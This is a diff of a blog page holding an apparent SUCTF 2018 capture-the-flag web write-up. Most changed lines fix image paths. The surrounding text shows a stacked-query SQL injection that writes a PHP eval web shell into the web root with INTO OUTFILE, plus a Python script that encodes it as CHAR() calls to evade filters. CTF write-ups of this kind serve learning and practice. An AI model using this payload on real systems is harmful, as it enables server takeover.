@@ -86,13 +86,13 @@
 <meta property="og:site_name" content="Altm4nz">
 <meta property="og:description" content="比赛时没时间做，官方赛后给出了writeup和docker镜像，好评。12345suctf/2018-web-multi_sqlsuctf/2018-web-homeworksuctf/2018-web-hateitsuctf/2018-web-getshellsuctf/2018-web-annonymous 环境部署docker还是很方便，一键部署，示例annonymous12docker p">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://altmanz.cn/2018/05/30/SUCTF-WEB/SUCTF-WEB/1.png">
-<meta property="og:image" content="http://altmanz.cn/2018/05/30/SUCTF-WEB/SUCTF-WEB/2.png">
+<meta property="og:image" content="http://altmanz.cn/2018/05/30/SUCTF-WEB/1.png">
+<meta property="og:image" content="http://altmanz.cn/2018/05/30/SUCTF-WEB/2.png">
 <meta property="og:updated_time" content="2018-06-04T14:30:37.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SUCTF-WEB">
 <meta name="twitter:description" content="比赛时没时间做，官方赛后给出了writeup和docker镜像，好评。12345suctf/2018-web-multi_sqlsuctf/2018-web-homeworksuctf/2018-web-hateitsuctf/2018-web-getshellsuctf/2018-web-annonymous 环境部署docker还是很方便，一键部署，示例annonymous12docker p">
-<meta name="twitter:image" content="http://altmanz.cn/2018/05/30/SUCTF-WEB/SUCTF-WEB/1.png">
+<meta name="twitter:image" content="http://altmanz.cn/2018/05/30/SUCTF-WEB/1.png">
 
 
 
@@ -315,7 +315,7 @@
 <p>将文件以16进制打印出来，然后转换成文本。<br>发现user.php是使用mysqli_multi_query进行查询的.<br>mysqli_multi_query:执行多个针对数据库的查询<br>所以这里应该就是写shell的地方。<br>为了绕过select和单引号，我们使用MYSQL预处理语句:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @sql = concat(<span class="string">'create table '</span>,newT,<span class="string">' like '</span>,old);</span><br><span class="line">prepare s1 <span class="keyword">from</span> @sql;</span><br><span class="line">execute s1;</span><br></pre></td></tr></table></figure></p>
 <p>将<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select"<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);<span class="meta">?&gt;</span></span>" into outfile '/var/www/html/favicon/altman.php';</span><br></pre></td></tr></table></figure></p>
 <p>进行编码<br>贴上一个编码脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b=<span class="string">''</span></span><br><span class="line">a=<span class="string">'''select "&lt;?php @eval($_POST['a']);?&gt;" into outfile '/var/www/html/favicon/altman.php';'''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a)):</span><br><span class="line">    b+=<span class="string">'CHAR('</span>+str(ord(a[i]))+<span class="string">'),'</span></span><br><span class="line"><span class="keyword">print</span> b</span><br></pre></td></tr></table></figure></p>
-<p>然后写入<br><img src="SUCTF-WEB/1.png" alt=""><br>执行命令拿到flag<br><img src="SUCTF-WEB/2.png" alt=""></p>
+<p>然后写入<br><img src="/2018/05/30/SUCTF-WEB/1.png" alt=""><br>执行命令拿到flag<br><img src="/2018/05/30/SUCTF-WEB/2.png" alt=""></p>
 
       
     </div>
@@ -433,7 +433,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">19</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
